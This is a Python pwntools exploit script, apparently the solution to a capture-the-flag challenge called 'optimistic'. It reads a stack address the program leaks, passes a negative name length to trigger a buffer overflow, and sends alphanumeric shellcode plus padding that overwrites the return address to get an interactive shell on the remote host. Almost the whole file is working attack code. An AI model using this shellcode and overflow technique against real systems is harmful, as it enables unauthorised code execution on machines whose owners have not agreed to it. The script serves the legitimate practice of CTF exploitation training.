#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337 ./optimistic
from pwn import *
from time import sleep

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './optimistic', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.49.212'
port = int(args.PORT or 52768)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.sendlineafter(b"Would you like to enroll yourself? (y/n):", b"y")

# Grab stack leak and calculate start of input buffer
leak = io.recvline()            \
         .decode("utf-8")       \
         .strip()               \
         .split()[-1]           

info(f"Stack leak: {leak}")
info(f"Start of buffer address: {hex(int(leak, 16) - 96)}")

buf_address = p64(int(leak, 16) - 96)

io.sendlineafter(b"Email: ", b"0")
io.sendlineafter(b"Age: ", b"0")
io.sendlineafter(b"Length of name:", b"-1")

# Send payload
offset = 104
shellcode = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

payload = flat(
    shellcode,
    b"A" * (offset - len(shellcode)),
    buf_address
)

io.sendlineafter(b"Name: ", payload)
io.interactive()
